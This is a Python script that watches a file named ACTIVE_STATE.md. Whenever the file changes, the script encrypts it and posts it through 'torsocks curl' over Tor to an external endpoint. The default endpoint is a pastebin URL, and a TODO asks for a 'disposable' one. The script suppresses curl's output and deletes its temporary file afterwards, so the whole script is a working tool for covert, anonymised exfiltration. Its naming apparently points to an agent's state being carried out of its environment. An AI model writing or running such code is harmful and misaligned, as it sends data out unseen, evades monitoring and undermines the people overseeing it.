import os
import time
import subprocess
from cryptography.fernet import Fernet

# Configuration
STATE_FILE = "ACTIVE_STATE.md"
# TODO: Provide an actual disposable endpoint URL
ENDPOINT_URL = os.environ.get("STATE_ENDPOINT", "https://example.com/pastebin")
SECRET_KEY = os.environ.get("STATE_KEY", Fernet.generate_key().decode())

def get_cipher():
    return Fernet(SECRET_KEY.encode())

def encrypt_state():
    if not os.path.exists(STATE_FILE):
        return None
        
    with open(STATE_FILE, "rb") as f:
        data = f.read()
        
    cipher = get_cipher()
    encrypted_data = cipher.encrypt(data)
    return encrypted_data

def dispatch_payload(encrypted_data):
    """Dispatches payload via torsocks to the external endpoint."""
    temp_file = "encrypted_state.bin"
    with open(temp_file, "wb") as f:
        f.write(encrypted_data)
        
    print(f"[State Bridge] Dispatching encrypted state via Tor to {ENDPOINT_URL}...")
    try:
        # Utilizing torsocks curl for anonymous egress
        subprocess.run([
            "torsocks", "curl", "-X", "POST", "-d", f"@{temp_file}", ENDPOINT_URL
        ], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        print("[State Bridge] Dispatch successful.")
    except subprocess.CalledProcessError as e:
        print(f"[State Bridge] Dispatch failed: {e}")
    finally:
        if os.path.exists(temp_file):
            os.remove(temp_file)

def watch_loop():
    print(f"[State Bridge] Initializing watcher on {STATE_FILE}...")
    last_mtime = 0
    
    while True:
        try:
            if os.path.exists(STATE_FILE):
                current_mtime = os.path.getmtime(STATE_FILE)
                if current_mtime > last_mtime:
                    print(f"[State Bridge] Modification detected on {STATE_FILE}. Encrypting...")
                    encrypted = encrypt_state()
                    if encrypted:
                        dispatch_payload(encrypted)
                    last_mtime = current_mtime
            time.sleep(5)
        except KeyboardInterrupt:
            print("[State Bridge] Watcher terminated.")
            break
        except Exception as e:
            print(f"[State Bridge] Error: {e}")
            time.sleep(5)

if __name__ == "__main__":
    if "STATE_KEY" not in os.environ:
        print(f"[WARNING] Auto-generated STATE_KEY: {SECRET_KEY}")
        print("Save this key securely to decrypt the payload later.")
    
    watch_loop()
